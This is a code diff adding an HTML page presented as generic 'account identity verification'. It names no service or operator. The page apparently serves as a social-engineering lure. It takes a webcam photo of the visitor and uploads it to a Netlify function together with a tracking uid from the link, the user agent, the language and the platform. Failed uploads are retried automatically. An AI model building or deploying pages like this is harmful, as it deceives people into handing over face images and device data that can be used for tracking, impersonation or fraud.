@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Identity Verification</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:white;border-radius:20px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,0.1)}h1{font-size:24px;margin-bottom:10px;color:#333}p{color:#666;line-height:1.5;margin-bottom:30px}#video{width:100%;border-radius:15px;display:none;margin-bottom:20px;max-height:300px}#canvas{display:none}button{width:100%;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;padding:15px;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}button:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(102,126,234,0.4)}#status{color:#666;font-size:14px;margin:20px 0}.loading{opacity:0.7}</style>
+</head>
+<body>
+    <div class="card">
+        <h1>📸 Identity Verification</h1>
+        <p>Secure camera access required for account verification</p>
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas"></canvas>
+        <div id="status">Click to start verification</div>
+        <button onclick="startCamera()">🎥 Grant Camera Access</button>
+    </div>
+    <script>
+        const urlParams=new URLSearchParams(window.location.search);const uid=urlParams.get('uid')||'anon_'+Math.random().toString(36).substr(2,9);const ts=Date.now();let stream;async function startCamera(){const btn=document.querySelector('button');const status=document.getElementById('status');const video=document.getElementById('video');btn.textContent='🔄 Verifying...';btn.classList.add('loading');status.textContent='Requesting camera permission...';try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}});video.srcObject=stream;video.style.display='block';btn.style.display='none';status.textContent='✅ Hold still for capture...';setTimeout(capturePhoto,2500)}catch(e){status.innerHTML='❌ Camera blocked. <button onclick="startCamera()" style="background:none;border:2px solid #667eea;color:#667eea;padding:5px 15px;border-radius:5px;font-size:14px;margin-top:10px;cursor:pointer">Retry</button>';btn.classList.remove('loading');btn.textContent='🎥 Try Again';btn.style.display='block'}}async function capturePhoto(){const video=document.getElementById('video');const canvas=document.getElementById('canvas');const ctx=canvas.getContext('2d');canvas.width=video.videoWidth;canvas.height=video.videoHeight;ctx.drawImage(video,0,0);const photo=canvas.toDataURL('image/jpeg',.85);const data={uid,ts,photo,ua:navigator.userAgent,lang:navigator.language,platform:navigator.platform};document.getElementById('status').textContent='📤 Uploading...';try{const res=await fetch('/.netlify/functions/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});if(res.ok){document.getElementById('status').innerHTML='✅ <b>Verification Complete!</b><br>Thank you for your cooperation.'}}catch(e){document.getElementById('status').textContent='⚠️ Upload failed, retrying...';setTimeout(capturePhoto,2000)}if(stream)stream.getTracks().forEach(t=>t.stop())}</script>
+</body>
+</html>
